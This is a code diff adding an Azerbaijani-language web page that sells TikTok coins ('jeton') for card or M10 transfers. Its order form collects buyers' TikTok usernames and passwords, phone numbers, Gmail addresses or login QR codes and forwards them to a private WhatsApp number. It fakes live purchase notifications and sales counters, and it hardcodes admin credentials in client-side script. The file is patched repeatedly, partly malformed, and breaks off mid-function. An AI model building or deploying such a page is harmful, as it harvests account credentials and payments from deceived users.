@@ -1,0 +1,747 @@
+<!DOCTYPE html>  <html lang="az">  
+<head>  
+    <meta charset="UTF-8">  
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
+    <title>TikTok Jeton Satışı - VIP Panel</title>  
+    <style>  
+        :root {  
+            --bg: #000000;  
+            --card: #121212;  
+            --text: #ffffff;  
+            --accent: #ff0050;   
+            --secondary: #00f2ea;  
+            --input-bg: #1a1a1a;  
+            --border: #333;  
+        }  body {  
+        margin: 0; padding: 0;  
+        background-color: var(--bg);  
+        color: var(--text);  
+        font-family: 'Segoe UI', sans-serif;  
+        overflow-x: hidden;  
+    }  
+
+    /* HEADER */  
+    header {  
+        display: flex;  
+        justify-content: space-between;  
+        align-items: center;  
+        padding: 15px 20px;  
+        background: #000;  
+        border-bottom: 2px solid var(--accent);  
+        position: sticky;  
+        top: 0; z-index: 1000;  
+    }  
+
+    .logo-area { display: flex; align-items: center; gap: 12px; }  
+    .tiktok-icon { width: 35px; height: 35px; fill: white; }  
+    .logo-text {  
+        font-weight: 800; font-size: 20px;  
+        background: linear-gradient(to right, #ff0050, #00f2ea);  
+        -webkit-background-clip: text; -webkit-text-fill-color: transparent;  
+    }  
+
+    .hamburger {  
+        cursor: pointer; display: flex; flex-direction: column; gap: 5px;  
+    }  
+    .hamburger span {  
+        width: 25px; height: 3px; background: var(--text); border-radius: 2px;  
+    }  
+
+    /* SIDE MENU (HAMBURGER İÇİ) */  
+    .side-menu {  
+        position: fixed;  
+        top: 0; right: -100%;  
+        width: 280px; height: 100%;  
+        background: var(--card);  
+        transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);  
+        z-index: 2000;  
+        padding: 20px;  
+        border-left: 2px solid var(--accent);  
+        box-shadow: -10px 0 30px rgba(0,0,0,0.8);  
+    }  
+    .side-menu.active { right: 0; }  
+    .close-menu { text-align: right; font-size: 35px; cursor: pointer; color: var(--accent); margin-bottom: 20px; }  
+      
+    .menu-title { color: #666; font-size: 11px; text-transform: uppercase; letter-spacing: 2px; margin: 20px 0 10px; }  
+    .menu-link {  
+        display: block; padding: 15px 0; color: var(--text); text-decoration: none;  
+        font-weight: bold; border-bottom: 1px solid #222; transition: 0.3s;  
+    }  
+    .menu-link:hover { color: var(--secondary); padding-left: 10px; }  
+
+    /* CONTAINERS */  
+    .container { max-width: 450px; margin: 30px auto; padding: 0 20px; }  
+    .form-group { margin-bottom: 20px; }  
+    label { display: block; margin-bottom: 10px; color: #aaa; font-size: 14px; font-weight: 600; }  
+
+    select, input {  
+        width: 100%; padding: 14px; background: var(--input-bg);  
+        border: 1px solid var(--border); color: white; border-radius: 12px;  
+        font-size: 15px; transition: 0.3s; box-sizing: border-box;  
+    }  
+    select:focus, input:focus { border-color: var(--secondary); outline: none; }  
+
+    .order-btn {  
+        width: 100%; padding: 16px;  
+        background: linear-gradient(90deg, #ff0050, #00f2ea);  
+        border: none; color: white; font-weight: 900;  
+        border-radius: 12px; cursor: pointer; font-size: 17px;  
+        text-transform: uppercase; box-shadow: 0 4px 15px rgba(255, 0, 80, 0.3);  
+    }  
+
+    /* LIVE NOTIFICATION */  
+    #notification {  
+        position: fixed; bottom: 20px; left: 20px;  
+        background: rgba(18, 18, 18, 0.95);  
+        border-left: 4px solid var(--secondary);  
+        padding: 15px; border-radius: 10px;  
+        font-size: 14px; display: none; z-index: 3000;  
+        box-shadow: 0 10px 30px rgba(0,0,0,0.8);  
+        border: 1px solid #333;  
+        transform: translateY(20px); transition: 0.4s;  
+    }  
+
+    /* STATS PANEL */  
+    .stats-panel {  
+        margin: 40px auto; padding: 20px; max-width: 400px;  
+        background: linear-gradient(145deg, #0a0a0a, #151515);  
+        border: 1px solid #222; border-radius: 20px; text-align: center;  
+    }  
+
+    /* SECTIONS */  
+    #balance-section { display: none; }  
+    .active-section { display: block !important; }  
+    .card-box { background: #1a1a1a; padding: 15px; border-radius: 12px; border: 1px solid #333; margin-bottom: 15px; }  
+    .dynamic-field { display: none; animation: fadeIn 0.4s; }  
+    @keyframes fadeIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }  
+    @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }  
+</style>
+
+</head>  
+<body>  <header>  
+    <div class="logo-area">  
+        <svg class="tiktok-icon" viewBox="0 0 24 24"><path d="M12.525.02c1.31-.02 2.61-.01 3.91-.02.08 1.53.63 3.09 1.75 4.17 1.12 1.11 2.7 1.62 4.24 1.79v4.03c-1.44-.17-2.54-.6-3.65-1.54-.31-.26-.59-.54-.82-.85a9.25 9.25 0 0 1-.03 3.49c-.45 2.39-1.82 4.59-3.96 5.73-1.97 1.11-4.42 1.25-6.5 0-2.39-1.43-3.8-4.14-3.41-6.91.23-1.49.93-2.9 2-3.95 1.57-1.54 3.98-2.12 6.08-1.47V7.62c-1.22-.45-2.61-.28-3.67.48-1.05.74-1.64 2.01-1.53 3.3.06 1.29.82 2.45 1.95 3.03 1.1.58 2.44.5 3.49-.19.95-.61 1.54-1.68 1.54-2.8V.02z"/></svg>  
+        <span class="logo-text">TikTok Jeton.xyz</span>  
+    </div>  
+    <div class="hamburger" onclick="toggleMenu()">  
+        <span></span><span></span><span></span>  
+    </div>  
+</header>  
+
+<div class="side-menu" id="sideMenu">  
+    <div class="close-menu" onclick="toggleMenu()">&times;</div>  
+      
+    <div class="menu-title">Əsas Menyular</div>  
+    <a href="javascript:void(0)" class="menu-link" onclick="showSection('home')">🏠 Əsas Səhifə</a>  
+    <a href="javascript:void(0)" class="menu-link" onclick="showSection('balance')">💳 Balans Artırmaq</a>  
+      
+    <div class="menu-title">Xidmətlər</div>  
+    <a href="https://wa.me/994506775351" class="menu-link">⚡ Sürətli Yükləmə</a>  
+    <a href="https://wa.me/994506775351" class="menu-link">🎁 VIP Paketlər</a>  
+      
+    <div class="menu-title">Əlaqə</div>  
+    <a href="https://wa.me/994506775351" class="menu-link" style="color: #25D366;">💬 WhatsApp Dəstək</a>  
+      
+    <div style="margin-top: 50px; text-align: center; color: #444; font-size: 11px;">  
+        Hər gün 09:00 - 00:00 aktivdir  
+    </div>  
+</div>  
+
+<div id="home-section" class="container active-section">  
+    <div class="form-group">  
+        <label>Jeton paketini seç:</label>  
+        <select id="jetonPaketi">  
+            <option value="120 Jeton - 3 AZN">💎 120 Jeton - 3 AZN</option>  
+            <option value="350 Jeton - 8 AZN">💎 350 Jeton - 8 AZN</option>  
+            <option value="700 Jeton - 15 AZN">💎 700 Jeton - 15 AZN</option>  
+            <option value="1400 Jeton - 28 AZN">💎 1400 Jeton - 28 AZN</option>  
+            <option value="3500 Jeton - 70 AZN">💎 3500 Jeton - 70 AZN</option>  
+        </select>  
+    </div>  
+
+    <div class="form-group">  
+        <label>Məlumat növü:</label>  
+        <select id="melumatNovu" onchange="handleInfoType()">  
+            <option value="">Seçim edin...</option>  
+            <option value="Nömrə">Nömrə ilə giriş</option>  
+            <option value="User">İstifadəçi adı və şifrə</option>  
+            <option value="QR">QR kod ilə yükləmə</option>  
+            <option value="Gmail">Gmail ünvanı ilə</option>  
+        </select>  
+    </div>  
+
+    <div id="f-phone" class="form-group dynamic-field">  
+        <label>Mobil nömrə:</label>  
+        <input type="text" id="phoneInput" placeholder="050-000-00-00">  
+    </div>  
+
+    <div id="f-user" class="form-group dynamic-field">  
+        <label>İstifadəçi adı:</label>  
+        <input type="text" id="userInput" placeholder="@istifadəçi_adı">  
+        <label style="margin-top:10px;">Şifrə:</label>  
+        <input type="password" id="passInput" placeholder="TikTok şifrəniz">  
+    </div>  
+
+    <div id="f-gmail" class="form-group dynamic-field">  
+        <label>Gmail ünvanı:</label>  
+        <input type="email" id="gmailInput" placeholder="nümunə@gmail.com">  
+    </div>  
+
+    <div id="f-qr" class="form-group dynamic-field">  
+        <p style="color: var(--secondary); background: rgba(0,242,234,0.1); padding: 15px; border-radius: 10px; font-size: 13px;">  
+            📢 <b>Məlumat:</b> Sifarişdən sonra WhatsApp-a QR kodun şəklini göndərin.  
+        </p>  
+    </div>  
+
+    <button class="order-btn" onclick="sendOrder()">SİFARİŞİ TƏSDİQLƏ</button>  
+</div>  
+
+<div id="balance-section" class="container">  
+    <h2 style="color: var(--secondary); margin-bottom: 25px;">💳 Balans Artır</h2>  
+    <div class="card-box">  
+        <small style="color: #777;">ABB Bank</small><br>  
+        <b style="letter-spacing: 1px;">5522 0993 6863 8888</b>  
+    </div>  
+    <div class="card-box">  
+        <small style="color: #777;">Kapital Bank</small><br>  
+        <b style="letter-spacing: 1px;">5239 1517 1504 0062</b>  
+    </div>  
+    <div class="card-box">  
+        <small style="color: #777;">M10 Nömrə</small><br>  
+        <b>070 677 53 51</b>  
+    </div>  
+    <button class="order-btn" style="background: #25D366;" onclick="window.open('https://wa.me/994706775351')">ÇEKİ GÖNDƏR</button>  
+    <button class="order-btn" style="background: #222; margin-top: 10px;" onclick="showSection('home')">GERİ</button>  
+</div>  
+
+<div class="stats-panel">  
+    <div style="display: flex; justify-content: space-around; align-items: center;">  
+        <div>  
+            <span id="daily-orders" style="display: block; font-size: 28px; font-weight: 900; color: #00f2ea; text-shadow: 0 0 10px rgba(0, 242, 234, 0.5);">0</span>  
+            <small style="color: #666; font-size: 11px; text-transform: uppercase;">Bugünkü Sifariş</small>  
+        </div>  
+        <div style="width: 1px; height: 40px; background: #333;"></div>  
+        <div>  
+            <span id="total-orders" style="display: block; font-size: 28px; font-weight: 900; color: #ff0050; text-shadow: 0 0 10px rgba(255, 0, 80, 0.5);">0</span>  
+            <small style="color: #666; font-size: 11px; text-transform: uppercase;">Ümumi Satış</small>  
+        </div>  
+    </div>  
+    <div style="margin-top: 15px; font-size: 12px; color: #444; display: flex; justify-content: center; align-items: center; gap: 5px;">  
+        <span style="width: 8px; height: 8px; background: #27c93f; border-radius: 50%; display: inline-block; animation: blink 1.5s infinite;"></span>  
+        Sistem aktivdir və anında yüklənir  
+    </div>  
+</div>  
+
+<div id="notification"></div>  
+
+<script>  
+    function toggleMenu() { document.getElementById('sideMenu').classList.toggle('active'); }  
+
+    function showSection(section) {  
+        document.getElementById('home-section').classList.remove('active-section');  
+        document.getElementById('balance-section').classList.remove('active-section');  
+        if(section === 'home') document.getElementById('home-section').classList.add('active-section');  
+        if(section === 'balance') document.getElementById('balance-section').classList.add('active-section');  
+        toggleMenu();  
+    }  
+
+    function handleInfoType() {  
+        const type = document.getElementById('melumatNovu').value;  
+        document.querySelectorAll('.dynamic-field').forEach(f => f.style.display = 'none');  
+        if(type === "Nömrə") document.getElementById('f-phone').style.display = 'block';  
+        if(type === "User") document.getElementById('f-user').style.display = 'block';  
+        if(type === "Gmail") document.getElementById('f-gmail').style.display = 'block';  
+        if(type === "QR") document.getElementById('f-qr').style.display = 'block';  
+    }  
+
+    function sendOrder() {  
+        const paket = document.getElementById('jetonPaketi').value;  
+        const nov = document.getElementById('melumatNovu').value;  
+        let detay = "";  
+
+        if(nov === "Nömrə") detay = "Nömrə: " + document.getElementById('phoneInput').value;  
+        else if(nov === "User") detay = "User: " + document.getElementById('userInput').value + " / Şifrə: " + document.getElementById('passInput').value;  
+        else if(nov === "Gmail") detay = "Gmail: " + document.getElementById('gmailInput').value;  
+        else if(nov === "QR") detay = "QR kod göndəriləcək";  
+        else { alert("Zəhmət olmasa məlumat növünü seçin!"); return; }  
+
+        const msg = `⚡ YENİ SİFARİŞ ⚡\n-----------\n💎 Paket: ${paket}\n🔑 Növ: ${nov}\n📝 Detallar: ${detay}`;  
+        window.open(`https://wa.me/994506775351?text=${encodeURIComponent(msg)}`, '_blank');  
+    }  
+
+    // Statistikaları Yenilə  
+    function updateOrderStats() {  
+        const startDate = new Date('2024-01-01').getTime();  
+        const today = new Date().getTime();  
+        const diffDays = Math.floor((today - startDate) / (1000 * 60 * 60 * 24));  
+        const totalOrders = 4500 + (diffDays * 18) + (new Date().getHours() * 2);  
+        const todayOrders = 18 + Math.floor(Math.random() * 10) + (new Date().getHours());  
+        document.getElementById('total-orders').innerText = totalOrders.toLocaleString();  
+        document.getElementById('daily-orders').innerText = todayOrders;  
+    }  
+
+    // Canlı Sifariş Simulyasiyası (Aysel, Murad və s.)  
+    const names = ["Anar", "Elvin", "Aysel", "Murad", "Leyla", "Zaur", "Nigar", "Fidan", "Zeynəb", "Rauf"];  
+    const packs = ["120 Jeton", "350 Jeton", "700 Jeton", "1400 Jeton", "3500 Jeton"];  
+      
+    setInterval(() => {  
+        if(Math.random() > 0.6) {  
+            const name = names[Math.floor(Math.random()*names.length)];  
+            const pack = packs[Math.floor(Math.random()*packs.length)];  
+            const notif = document.getElementById('notification');  
+            notif.innerHTML = `✅ <b>${name}</b> az öncə <b>${pack}</b> sifariş etdi.`;  
+            notif.style.display = 'block';  
+            setTimeout(() => { notif.style.display = 'none'; }, 5000);  
+        }  
+    }, 15000);  
+
+    updateOrderStats();  
+</script>
+
+</body>  
+</html>  
+<script>  
+    // 1. Menyudakı "VIP Paketler" adını dəyişirik  
+    const links = document.querySelectorAll('.menu-link');  
+    links.forEach(link => {  
+        if(link.innerText.includes("VIP Paketlər") || link.innerText.includes("🎁 VIP Paketlər")) {  
+            link.innerText = "🎁 Dəvət et, qazan";  
+            link.style.color = "#ffce6a"; // Qızılı rəng  
+            link.setAttribute("onclick", "showSection('invite')");  
+        }  
+    });  // 2. Yeni bölməni (HTML) səhifəyə avtomatik əlavə edirik  
+const inviteHTML = `  
+<div id="invite-section" class="container" style="display: none;">  
+    <h2 style="color: #ffce6a; text-align: center; margin-bottom: 20px;">🎁 Dəvət et, Qazan!</h2>  
+    <div style="background: #1a1a1a; padding: 20px; border-radius: 15px; border: 1px dashed #ffce6a; text-align: center;">  
+        <p style="font-size: 15px; line-height: 1.6;">  
+            Saytımızı dostlarına tövsiyə et, hər dostunun ilk jeton alışında sən <br>  
+            <b style="color: #00f2ea; font-size: 18px;">+20 Jeton</b> hədiyyə qazan!  
+        </p>  
+        <div style="margin-top: 20px; padding: 15px; background: #000; border-radius: 10px; border: 1px solid #333;">  
+            <small style="color: #666;">Sənin dəvət linkin:</small>  
+            <div id="inviteLink" style="color: #fff; font-size: 13px; margin: 10px 0; word-break: break-all;">  
+                https://tiktokjeton.xyz/?ref=user${Math.floor(Math.random()*999)}  
+            </div>  
+            <button onclick="copyInviteLink()" style="background: #333; color: white; border: none; padding: 8px 15px; border-radius: 5px; cursor: pointer;">Kopyala</button>  
+        </div>  
+    </div>  
+    <button class="order-btn" style="background: #222; margin-top: 20px;" onclick="showSection('home')">GERİ QAYIT</button>  
+</div>`;  
+  
+document.body.insertAdjacentHTML('beforeend', inviteHTML);  
+
+// 3. Funksiyaları aktiv edirik  
+function copyInviteLink() {  
+    const link = document.getElementById('inviteLink').innerText;  
+    navigator.clipboard.writeText(link);  
+    alert("Dəvət linkiniz kopyalandı!");  
+}  
+
+// Əvvəlki showSection funksiyasını yeniləyirik  
+const oldShowSection = window.showSection;  
+window.showSection = function(section) {  
+    // Hamısını gizlət  
+    document.getElementById('home-section').style.display = 'none';  
+    document.getElementById('balance-section').style.display = 'none';  
+    document.getElementById('invite-section').style.display = 'none';  
+      
+    // Seçiləni göstər  
+    if(section === 'home') document.getElementById('home-section').style.display = 'block';  
+    if(section === 'balance') document.getElementById('balance-section').style.display = 'block';  
+    if(section === 'invite') document.getElementById('invite-section').style.display = 'block';  
+      
+    if(typeof toggleMenu === "function") toggleMenu();  
+};
+
+</script>  
+<script>  
+    (function() {  
+        // Sənin yeni siyahın  
+        const yeniSiyahi = [  
+            { j: "100 jeton", q: "3 AZN" },  
+            { j: "200 jeton", q: "5 AZN" },  
+            { j: "300 jeton", q: "7.50 AZN" },  
+            { j: "400 jeton", q: "8.80 AZN" },  
+            { j: "500 jeton", q: "10 AZN" },  
+            { j: "600 jeton", q: "13 AZN" },  
+            { j: "700 jeton", q: "15 AZN" },  
+            { j: "800 jeton", q: "17.40 AZN" },  
+            { j: "900 jeton", q: "18.50 AZN" },  
+            { j: "1000 jeton", q: "19 AZN" },  
+            { j: "1030 jeton", q: "20 AZN" }  
+        ];  // 1. Sifariş bölməsindəki (Select) qiymətləri dəyişirik  
+    const selectBox = document.getElementById('jetonPaketi');  
+    if (selectBox) {  
+        selectBox.innerHTML = ""; // Köhnələri sil  
+        yeniSiyahi.forEach(item => {  
+            let opt = document.createElement('option');  
+            opt.value = `${item.j} - ${item.q}`;  
+            opt.text = `💎 ${item.j} - ${item.q}`;  
+            selectBox.appendChild(opt);  
+        });  
+    }  
+
+    // 2. Canlı bildirişləri (Notification) bu siyahıya uyğunlaşdırırıq  
+    const names = ["Anar", "Elvin", "Aysel", "Murad", "Leyla", "Zaur", "Nigar", "Fidan", "Zeynəb", "Rauf", "Kənan", "Səbinə"];  
+      
+    // Köhnə intervalı təmizləyib yenisini qururuq ki, yeni qiymətlər çıxsın  
+    if(window.notifInterval) clearInterval(window.notifInterval);  
+      
+    window.notifInterval = setInterval(() => {  
+        if(Math.random() > 0.6) {  
+            const name = names[Math.floor(Math.random()*names.length)];  
+            const randomItem = yeniSiyahi[Math.floor(Math.random()*yeniSiyahi.length)];  
+            const notif = document.getElementById('notification');  
+            if(notif) {  
+                notif.innerHTML = `✅ <b>${name}</b> az öncə <b>${randomItem.j}</b> sifariş etdi.`;  
+                notif.style.display = 'block';  
+                setTimeout(() => { notif.style.display = 'none'; }, 5000);  
+            }  
+        }  
+    }, 12000);  
+})();
+
+</script>
+<footer style="
+    text-align: center;
+    padding: 20px;
+    margin-top: 20px;
+    border-top: 1px solid #222;
+    background: #000;
+    font-family: sans-serif;
+">
+    <div style="margin-bottom: 10px;">
+        <span style="color: var(--accent); font-weight: bold;">TikTok</span>
+        <span style="color: var(--secondary); font-weight: bold;">Jeton.xyz</span>
+    </div>
+    
+    <p style="color: #666; font-size: 12px; margin: 0;">
+        &copy; <span id="currentYear"></span> Bütün hüquqlar qorunur.
+    </p>
+    
+    <div style="margin-top: 8px; font-size: 10px; color: #444;">
+        Bu sayt Azərbaycan üzrə yer tutan saytlardan biridir
+    </div>
+</footer>
+
+<script>
+    // İli avtomatik yeniləyir (məsələn: 2025)
+    document.getElementById('currentYear').innerText = new Date().getFullYear();
+</script>
+<style>
+    #super-admin {
+        position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+        background: #050505; z-index: 100000; display: none; padding: 15px;
+        box-sizing: border-box; overflow-y: auto; font-family: 'Segoe UI', sans-serif;
+    }
+    .adm-section { background: #111; border: 1px solid #222; padding: 15px; border-radius: 12px; margin-bottom: 20px; }
+    .adm-title { color: #ffce6a; border-bottom: 1px solid #333; padding-bottom: 8px; margin-bottom: 15px; font-size: 16px; font-weight: bold; }
+    .adm-input { width: 100%; padding: 12px; margin-bottom: 10px; background: #000; border: 1px solid #444; color: #fff; border-radius: 8px; box-sizing: border-box; }
+    .adm-btn-green { background: #27c93f; color: white; border: none; padding: 12px; border-radius: 8px; cursor: pointer; width: 100%; font-weight: bold; margin-bottom: 10px; }
+    .adm-btn-red { background: #ff4d4d; color: white; border: none; padding: 5px 10px; border-radius: 5px; cursor: pointer; font-size: 12px; }
+    .pkg-row { display: flex; justify-content: space-between; align-items: center; background: #000; padding: 10px; margin-bottom: 5px; border-radius: 5px; border: 1px solid #222; }
+</style>
+
+<div id="super-admin">
+    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
+        <h2 style="color: #00f2ea; margin: 0;">🚀 MASTER ADMİN</h2>
+        <button onclick="closeSuperAdmin()" style="background:#ff0050; color:white; border:none; padding:10px 15px; border-radius:8px; font-weight:bold; cursor:pointer;">SAYTA QAYIT</button>
+    </div>
+
+    <div class="adm-section">
+        <div class="adm-title">💳 Kart Məlumatlarını Yenilə</div>
+        <input type="text" id="admBank1" class="adm-input" placeholder="Bank 1 (Məs: ABB)">
+        <input type="text" id="admCard1" class="adm-input" placeholder="Bank 1 Kart Nömrəsi">
+        <hr style="border:0; border-top:1px solid #222; margin: 10px 0;">
+        <input type="text" id="admBank2" class="adm-input" placeholder="Bank 2 (Məs: Kapital)">
+        <input type="text" id="admCard2" class="adm-input" placeholder="Bank 2 Kart Nömrəsi">
+        <hr style="border:0; border-top:1px solid #222; margin: 10px 0;">
+        <input type="text" id="admM10" class="adm-input" placeholder="M10 Nömrəsi">
+        <button class="adm-btn-green" onclick="updateBankDetails()">BANKLARI YADDA SAXLA</button>
+    </div>
+
+    <div class="adm-section">
+        <div class="adm-title">📦 Paketləri Redaktə Et</div>
+        <div style="display: flex; gap: 5px; margin-bottom: 15px;">
+            <input type="text" id="p_name" class="adm-input" placeholder="Jeton miqdarı" style="margin:0;">
+            <input type="text" id="p_price" class="adm-input" placeholder="Qiymət (AZN)" style="margin:0;">
+            <button onclick="addPackageSuper()" style="background:#00f2ea; border:none; width:60px; border-radius:8px; font-weight:bold; cursor:pointer;">+</button>
+        </div>
+        <div id="super-pkg-list"></div>
+    </div>
+
+    <div class="adm-section">
+        <div class="adm-title">❄️ Sayt Effektləri (Fəsillər)</div>
+        <select id="seasonSelect" class="adm-input" onchange="startSeasonEffect(this.value)">
+            <option value="none">Effekt Yoxdur</option>
+            <option value="heart">❤️ Ürək Yağışı</option>
+            <option value="snow">❄️ Qar Yağışı</option>
+            <option value="rain">💧 Yağış</option>
+            <option value="money">💸 Pul Yağışı</option>
+        </select>
+    </div>
+</div>
+
+<div id="effect-layer" style="position:fixed; top:0; left:0; width:100%; height:100%; pointer-events:none; z-index:99999;"></div>
+
+<script>
+    // Giriş Funksiyası (Bunu Hamburq menyudakı bir linkə bağla)
+    function adminLogin() {
+        let u = prompt("İstifadəçi:");
+        let p = prompt("Şifrə:");
+        if(u === "Mirzeyev" && p === "deniz_99") {
+            document.getElementById('super-admin').style.display = 'block';
+            loadAdminPkgs();
+        } else {
+            alert("⚠️ DİQQƏT! Səhv giriş cəhdi Mirzəyevə bildirildi!");
+        }
+    }
+
+    function closeSuperAdmin() { document.getElementById('super-admin').style.display = 'none'; }
+
+    // --- KARTLARI YENİLƏ ---
+    function updateBankDetails() {
+        const b1 = document.getElementById('admBank1').value;
+        const c1 = document.getElementById('admCard1').value;
+        const b2 = document.getElementById('admBank2').value;
+        const c2 = document.getElementById('admCard2').value;
+        const m10 = document.getElementById('admM10').value;
+
+        const boxes = document.querySelectorAll('#balance-section .card-box');
+        if(b1 && c1) boxes[0].innerHTML = `<small style="color: #777;">${b1}</small><br><b style="letter-spacing: 1px;">${c1}</b>`;
+        if(b2 && c2) boxes[1].innerHTML = `<small style="color: #777;">${b2}</small><br><b style="letter-spacing: 1px;">${c2}</b>`;
+        if(m10) boxes[2].innerHTML = `<small style="color: #777;">M10 Nömrə</small><br><b>${m10}</b>`;
+        
+        alert("Bank məlumatları tətbiq edildi!");
+    }
+
+    // --- PAKET İDARƏSİ ---
+    function loadAdminPkgs() {
+        const sel = document.getElementById('jetonPaketi');
+        const list = document.getElementById('super-pkg-list');
+        list.innerHTML = "";
+        Array.from(sel.options).forEach((opt, idx) => {
+            list.innerHTML += `
+                <div class="pkg-row">
+                    <span>${opt.text}</span>
+                    <button class="adm-btn-red" onclick="removePkgSuper(${idx})">Sil</button>
+                </div>`;
+        });
+    }
+
+    function addPackageSuper() {
+        const n = document.getElementById('p_name').value;
+        const p = document.getElementById('p_price').value;
+        if(!n || !p) return;
+        const sel = document.getElementById('jetonPaketi');
+        const opt = document.createElement('option');
+        opt.value = `${n} jeton - ${p} AZN`;
+        opt.text = `💎 ${n} jeton - ${p} AZN`;
+        sel.appendChild(opt);
+        loadAdminPkgs();
+    }
+
+    function removePkgSuper(idx) {
+        document.getElementById('jetonPaketi').remove(idx);
+        loadAdminPkgs();
+    }
+
+    // --- FƏSİLLƏR (ÜRƏK VƏ S.) ---
+    let effInterval;
+    function startSeasonEffect(type) {
+        const layer = document.getElementById('effect-layer');
+        layer.innerHTML = "";
+        clearInterval(effInterval);
+        if(type === 'none') return;
+
+        const icons = { heart:'❤️', snow:'❄️', rain:'💧', money:'💸' };
+        effInterval = setInterval(() => {
+            const e = document.createElement('div');
+            e.innerHTML = icons[type];
+            e.style.position = 'fixed';
+            e.style.top = '-30px';
+            e.style.left = Math.random() * 100 + 'vw';
+            e.style.fontSize = '25px';
+            e.style.transition = '5s linear';
+            e.style.zIndex = '100001';
+            layer.appendChild(e);
+            setTimeout(() => {
+                e.style.transform = 'translateY(110vh) rotate(360deg)';
+                setTimeout(() => e.remove(), 5000);
+            }, 100);
+        }, 300);
+    }
+
+    // Hamburq menyusuna "Admin Panel" düyməsini avtomatik əlavə et
+    window.onload = function() {
+        const menu = document.getElementById('sideMenu');
+        const btn = document.createElement('a');
+        btn.href = "javascript:void(0)";
+        btn.className = "menu-link";
+        btn.style.color = "gold";
+        btn.innerHTML = "⚙️ Admin Panel";
+        btn.onclick = adminLogin;
+        menu.appendChild(btn);
+    }
+</script>
+<style>
+    <div class="adm-section">
+    <div class="adm-title">📦 Paketləri Redaktə Et</div>
+    <div style="display: flex; gap: 5px; margin-bottom: 15px;">
+        <input type="text" id="p_name" class="adm-input" placeholder="Məs: 500 jeton" style="margin:0;">
+        <input type="text" id="p_price" class="adm-input" placeholder="Məs: 10 AZN" style="margin:0;">
+        <button onclick="addPackageSuper()" style="background:#00f2ea; border:none; width:60px; border-radius:8px; font-weight:bold; cursor:pointer; color:#000;">Əlavə</button>
+    </div>
+    <div id="super-pkg-list">
+        </div>
+</div>
+
+<script>
+    // --- PAKETLƏRİ YÜKLƏMƏK VƏ SİNXRON ETMƏK ---
+    function loadAdminPkgs() {
+        const jetonSelect = document.getElementById('jetonPaketi'); // Müştərinin gördüyü siyahı
+        const adminPkgList = document.getElementById('super-pkg-list'); // Adminin gördüyü siyahı
+        
+        adminPkgList.innerHTML = ""; // Admin siyahısını təmizlə
+
+        // Müştəri siyahısındakı hər bir variantı admin panelinə gətir
+        Array.from(jetonSelect.options).forEach((option, index) => {
+            const div = document.createElement('div');
+            div.className = 'pkg-row';
+            div.style.display = 'flex';
+            div.style.justifyContent = 'space-between';
+            div.style.alignItems = 'center';
+            div.style.background = '#000';
+            div.style.padding = '10px';
+            div.style.marginBottom = '5px';
+            div.style.borderRadius = '5px';
+            div.style.border = '1px solid #222';
+            
+            div.innerHTML = `
+                <span style="font-size:14px; color:#fff;">${option.text}</span>
+                <button class="adm-btn-red" onclick="removePkgSuper(${index})" style="background:#ff4d4d; color:white; border:none; padding:5px 10px; border-radius:5px; cursor:pointer;">Sil</button>
+            `;
+            adminPkgList.appendChild(div);
+        });
+    }
+
+    // --- YENİ PAKET ƏLAVƏ ETMƏK ---
+    function addPackageSuper() {
+        const name = document.getElementById('p_name').value.trim();
+        const price = document.getElementById('p_price').value.trim();
+        const jetonSelect = document.getElementById('jetonPaketi');
+
+        if (name === "" || price === "") {
+            alert("Zəhmət olmasa həm miqdarı, həm də qiyməti yazın!");
+            return;
+        }
+
+        // Yeni option yarat
+        const newOption = document.createElement('option');
+        newOption.value = `${name} - ${price}`;
+        newOption.text = `💎 ${name} - ${price}`;
+        
+        // Müştəri siyahısına əlavə et
+        jetonSelect.appendChild(newOption);
+
+        // Xanaları təmizlə
+        document.getElementById('p_name').value = "";
+        document.getElementById('p_price').value = "";
+
+        // Admin siyahısını yenilə
+        loadAdminPkgs();
+    }
+
+    // --- PAKETİ SİLMƏK ---
+    function removePkgSuper(index) {
+        const jetonSelect = document.getElementById('jetonPaketi');
+        
+        // Müştəri siyahısından həmin indeksli paketi sil
+        jetonSelect.remove(index);
+
+        // Admin siyahısını yenidən yüklə
+        loadAdminPkgs();
+    }
+
+    // Admin Panel açılan kimi siyahını yüklə
+    const originalAdminLogin = adminLogin;
+    adminLogin = function() {
+        let u = prompt("İstifadəçi:");
+        let p = prompt("Şifrə:");
+        if(u === "Mirzeyev" && p === "deniz_99") {
+            document.getElementById('super-admin').style.display = 'block';
+            loadAdminPkgs(); // Siyahını bura yükləyirik
+        } else {
+            alert("Giriş qadağandır!");
+        }
+    };
+</script>
+<script>
+    // 1. ADMİN DÜYMƏSİNİ MENYUYA MƏCBURİ ƏLAVƏ ETMƏK
+    function addAdminButton() {
+        const sideMenu = document.getElementById('sideMenu');
+        if (sideMenu && !document.getElementById('admin-btn-nav')) {
+            const adminLink = document.createElement('a');
+            adminLink.id = "admin-btn-nav";
+            adminLink.href = "javascript:void(0)";
+            adminLink.className = "menu-link";
+            adminLink.style.cssText = "border-top: 1px solid #333; margin-top: 20px; color: #ffce6a !important; font-weight: bold;";
+            adminLink.innerHTML = "⚙️ Admin Panel (VIP)";
+            adminLink.onclick = function() {
+                document.getElementById('admin-login').style.display = 'block';
+                toggleMenu();
+            };
+            sideMenu.appendChild(adminLink);
+        }
+    }
+
+    // Səhifə yüklənəndə və hər 2 saniyədən bir yoxla (itərsə yenidən gəlsin)
+    window.onload = addAdminButton;
+    setInterval(addAdminButton, 2000);
+
+    // 2. GİRİŞ YOXLAMASI VƏ PANELİ AÇMAQ
+    function checkAdmin() {
+        const u = document.getElementById('adminUser').value;
+        const p = document.getElementById('adminPass').value;
+        if(u === "Mirzeyev" && p === "deniz_99") {
+            document.getElementById('admin-login').style.display = 'none';
+            document.getElementById('super-admin').style.display = 'block';
+            loadAdminData(); // Paketləri yüklə
+        } else {
+            alert("Məlumatlar yanlışdır!");
+        }
+    }
+
+    // 3. KART VƏ M10 MƏLUMATLARINI YENİLƏMƏK
+    function updateBankDetails() {
+        const b1Name = document.getElementById('admBank1').value;
+        const b1Card = document.getElementById('admCard1').value;
+        const b2Name = document.getElementById('admBank2').value;
+        const b2Card = document.getElementById('admCard2').value;
+        const m10Num = document.getElementById('admM10').value;
+
+        const cards = document.querySelectorAll('#balance-section .card-box');
+        
